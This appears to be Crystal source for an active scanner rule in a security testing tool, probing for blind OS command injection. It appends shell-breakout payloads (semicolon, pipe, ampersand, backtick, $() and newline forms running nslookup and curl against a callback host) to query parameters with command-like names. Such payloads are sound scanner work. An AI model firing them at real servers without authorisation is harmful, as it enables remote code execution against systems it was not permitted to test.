require "uri"
require "./types"
require "../out_of_band"
require "../../miner/inject"
require "../../fuzz/content_length"
require "../../proxy/codec/http1"

module Gori
  module Probe
    module Active
      # Active blind OS command-injection probe, OUT-OF-BAND. When a request parameter is
      # concatenated into a shell command the server runs — the classic network-diagnostic
      # surface (`/ping?host=…` shelling out to `ping`, an `nslookup`/`traceroute` wrapper, an
      # `?cmd=`/`?exec=` admin helper) — a value carrying a shell metacharacter breaks out of the
      # intended command and runs the attacker's. The result is remote code execution, the most
      # severe finding in the active set.
      #
      # Like blind SSRF (`SsrfOast`), the tell is not on the sending socket: a blind injection
      # produces no reflected output gori can read. So this rule cannot confirm itself in band —
      # it plants an OAST payload and leaves the proof to `Probe::OutOfBand.sweep`, which fires
      # when (and only when) the target's shell actually resolves or fetches the interaction
      # host. The injected commands are a name lookup of the minted host (`nslookup`) AND an
      # HTTP fetch of the minted URL (`curl`) — interactsh/BOAST put the token in DNS, while
      # webhook.site/postbin/custom-http put it in the path or query, so `nslookup` of a URL
      # payload would never carry a unique token. Either callback confirms execution.
      #
      # Gated to keep the automatic scan quiet and the finding meaningful, mirroring SsrfOast:
      #   * runs ONLY when the project has a registered OAST listener (`opts.oob`). No listener,
      #     no payload to mint, no plan — the check is simply absent for a project that never set
      #     one up, rather than a switch to toggle.
      #   * GET by default (a diagnostic parameter is overwhelmingly a query parameter);
      #     `allow_unsafe` widens the method gate so a POST that still carries the name on the
      #     query string is probed. Body slots are not read.
      #   * the parameter NAME must be one of the conventional command / diagnostic names
      #     (`cmd`, `ping`, `host`, `nslookup`, …). Command-injection values are arbitrary text
      #     (a hostname, a filename, a flag), so — unlike SSRF — there is no value SHAPE to gate
      #     on; the name is the whole signal, so the set is kept deliberately tight (every member
      #     spends a payload on every hit).
      #
      # Only the FIRST qualifying parameter is probed per flow: minting more payloads than the
      # one that matters would spend the operator's interaction budget on noise, and a callback
      # attributes to a single parameter anyway. Safe by construction — an `nslookup`/`curl`
      # payload landing in a parameter that never reaches a shell is treated as an ordinary
      # (odd) string and mutates nothing, so the query-only, safe-method default never changes
      # server state.
      class CmdInjectionOast < Rule
        # Query parameter names that conventionally flow into an OS command. Two families:
        # explicit command runners (`cmd`/`exec`/`shell`) and the network-diagnostic wrappers
        # (`ping`/`nslookup`/`traceroute`/`host`) that shell out to a tool with the parameter as
        # its argument. Kept tight for the same reason SsrfOast's list is: every name here sends
        # a probe, so a false member is a payload wasted on every hit.
        CMD_PARAMS = Set{"cmd", "command", "exec", "execute", "shell", "subprocess",
                         "ping", "host", "hostname", "ip", "addr", "address",
                         "domain", "dns", "lookup", "nslookup", "traceroute", "tracert", "mtr"}

        # Shell-breakout templates. `HOST` is the lookup name (URI host of a URL payload, else
        # the payload itself); `URL` is the fetchable form (`payload` if it already has `://`,
        # else `http://#{payload}`). Concatenated AFTER the parameter's original value so a
        # legitimate leading command (`ping <value>`) still parses and the shell then reaches
        # ours. Each fragment leads with a DIFFERENT metacharacter so that whichever one the
        # target's shell honours triggers the SAME callback — attributed by token regardless of
        # which separator fired, so packing several into one value is what makes this a
        # single-request check. `nslookup` covers DNS-capable providers (Linux/macOS/Windows);
        # `curl "URL"` is what uniquely confirms webhook.site/postbin/custom-http, whose nonce
        # lives in the path or query. Double-quoted so a custom-http `?oid=`/`&oid=` does not
        # background in the shell. The backtick / `$()` forms stay Unix-only nslookup; they land
        # as harmless literals on a Windows shell that ignores them.
        BREAKOUTS = [
          ";nslookup HOST;curl \"URL\";",    # sh/bash sequential
          "|nslookup HOST",                  # pipe
          "&nslookup HOST&curl \"URL\"&",    # background / Windows `cmd` chain
          "`nslookup HOST`",                 # backtick command substitution
          "$(nslookup HOST)",                # $() command substitution
          "\nnslookup HOST\ncurl \"URL\"\n", # newline (argument / script injection)
        ]

        def info : RuleInfo
          RuleInfo.new("cmd_injection_oast", "Blind OS command injection (out-of-band)",
            "Appends a shell-breakout OAST payload to a command/diagnostic parameter and flags the " \
            "finding when the server's shell calls back.",
            Category::ACTIVE)
        end

        # One probe: the breakout polyglot is packed into a single request. Static annotation for
        # the Rules sub-tab + manual-run estimate.
        def requests_per_flow : Range(Int32, Int32)
          1..1
        end

        def dedup_key(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : String?
          # No minter ⇒ plan returns nil ⇒ this must too (the dedup_key⇔plan equivalence). The
          # check is a nil test on an already-resolved field — it never mints, so the cheap
          # pre-plan key stays cheap.
          return nil unless opts.oob
          g = gate(detail, opts) || return nil
          key_string(detail, g[0], g[1], g[4])
        end

        def plan(detail : Store::FlowDetail, opts : Options = Options::DEFAULT) : Plan?
          minter = opts.oob || return nil
          g = gate(detail, opts) || return nil
          method_up, path, pairs, idx, name = g
          minted = minter.mint || return nil # listener went away between dedup_key and here
          payload, token, session_id = minted
          value = inject_value(pairs[idx], payload)
          request = rebuild_query(detail.request_head, detail.request_body, path,
            with_replaced(pairs, idx, encode_value(value)))
          candidate = OutOfBand::Candidate.new(
            token: token, payload: payload, session_id: session_id,
            code: "cmd_injection_oast",
            title: "Blind OS command injection (server executed an injected command)",
            severity: Store::Severity::Critical,
            evidence: "param `#{name}` injected with an OS-command OAST payload"[0, 120])
          Plan.new(request, [Param.new("query", name, token)],
            key_string(detail, method_up, path, name), oob: [candidate])
        end

        # Blind by construction: nothing on the sending socket confirms it. The empty return is
        # not a stub — it is the whole point. Promotion happens in `OutOfBand.sweep` when the
        # payload's callback arrives, possibly minutes later and in another process.
        def detections(plan : Plan, result : Repeater::Result, detail : Store::FlowDetail) : Array(Detection)
          [] of Detection
        end

        # The injected value: the parameter's ORIGINAL (decoded) value, then every breakout
        # fragment with `HOST`/`URL` filled in. Keeping the original as a prefix lets the
        # legitimate leading command parse before the separators hand control to nslookup/curl.
        private def inject_value(pair : String, payload : String) : String
          eq = pair.index('=')
          orig = eq ? decode(pair[(eq + 1)..]) : ""
          url, host = payload_parts(payload)
          orig + BREAKOUTS.join(&.gsub("HOST", host).gsub("URL", url))
        end

        # Fetchable URL and lookup host, mirroring SsrfOast#inject_url's provider split.
        # A URL-minting provider (webhook.site / postbin / custom-http) is used verbatim as
        # the fetch target and only its URI host is handed to nslookup — nslookup of the
        # full URL cannot put a path/query nonce in the DNS haystack the sweep matches on.
        private def payload_parts(payload : String) : {String, String}
          if payload.includes?("://")
            host = (URI.parse(payload).host rescue nil)
            host = payload if host.nil? || host.empty?
            {payload, host}
          else
            {"http://#{payload}", payload}
          end
        end

        # Percent-encode the injected value so the shell metacharacters (`;`, `|`, `&`, backtick,
        # quotes, spaces, newlines) ride inside the parameter without corrupting the query.
        # `space_to_plus: false` so a space becomes `%20`, which decodes to a real space under
        # BOTH form- and percent-decoding — a `+` would survive verbatim on a percent-decoding
        # endpoint and split `nslookup HOST` / `curl "URL"` into a bad argument.
        private def encode_value(value : String) : String
          URI.encode_www_form(value, space_to_plus: false)
        end

        # Shared gate for plan + dedup_key. Returns {METHOD, path, query pairs, index of the
        # first command-shaped param, its DECODED name}, or nil. Both paths funnel here so they
        # cannot drift (the equivalence-spec invariant).
        private def gate(detail : Store::FlowDetail, opts : Options) : {String, String, Array(String), Int32, String}?
          method, target, malformed = Proxy::Codec::Http1.parse_request_line(detail.request_head)
          return nil if malformed
          method_up = method.upcase
          return nil unless method_allowed?(method_up, opts)
          path, query = split_target(Active.origin_form(target))
          return nil if query.empty?
          pairs = query.split('&')
          found = first_cmd_param(pairs) || return nil
          {method_up, path, pairs, found[0], found[1]}
        end

        # {index, decoded name} of the first query pair whose NAME is a conventional command /
        # diagnostic parameter, else nil. A non-empty value is required — an empty parameter
        # carries nothing to concatenate a command onto.
        private def first_cmd_param(pairs : Array(String)) : {Int32, String}?
          pairs.each_with_index do |pair, i|
            next if pair.empty?
            eq = pair.index('=')
            next unless eq
            raw_name = pair[0...eq]
            next if raw_name.empty?
            raw_value = pair[(eq + 1)..]
            next if raw_value.empty?
            dname = decode(raw_name)
            return {i, dname} if CMD_PARAMS.includes?(dname.downcase)
          end
          nil
        end

        private def key_string(detail : Store::FlowDetail, method_upcase : String, path : String, name : String) : String
          "cmd_injection_oast|#{detail.row.host}:#{detail.row.port}|#{method_upcase}|#{path}|#{name.bytesize}:#{name}"
        end

        # A copy of the query pairs with pair `idx`'s value replaced (name kept verbatim).
        private def with_replaced(pairs : Array(String), idx : Int32, value : String) : String
          dup = pairs.dup
          pair = dup[idx]
          if eq = pair.index('=')
            dup[idx] = "#{pair[0...eq]}=#{value}"
          end
          dup.join('&')
        end

        # Percent-decoded AND scrubbed: a captured value can carry an invalid-UTF-8 byte (`%FF`),
        # and it flows into string concatenation + `gsub`, so scrub keeps this total. Mirrors
        # SsrfOast#decode (same reasoning, stated there in full).
        private def decode(s : String) : String
          URI.decode_www_form(s).scrub
        rescue
          s.scrub
        end

        private def split_target(target : String) : {String, String}
          qi = target.index('?')
          return {target, ""} unless qi
          {target[0...qi], target[(qi + 1)..]}
        end

        # Reassemble the request with a new query on the request line, preserving the body and
        # re-syncing Content-Length (mirrors SsrfOast#rebuild_query / OpenRedirect).
        private def rebuild_query(orig_head : Bytes, body : Bytes?, path : String, new_query : String) : Bytes
          head, _, eol = Miner::Inject.split(orig_head)
          lines = String.new(head).split(eol)
          unless lines.empty?
            parts = lines[0].split(' ')
            if parts.size == 3
              target = new_query.empty? ? path : "#{path}?#{new_query}"
              lines[0] = "#{parts[0]} #{target} #{parts[2]}"
            end
          end
          io = IO::Memory.new
          io << lines.join(eol) << eol << eol
          b = body || Bytes.empty
          io.write(b) unless b.empty?
          Fuzz::ContentLength.sync(io.to_slice, false)
        end
      end
    end
  end
end
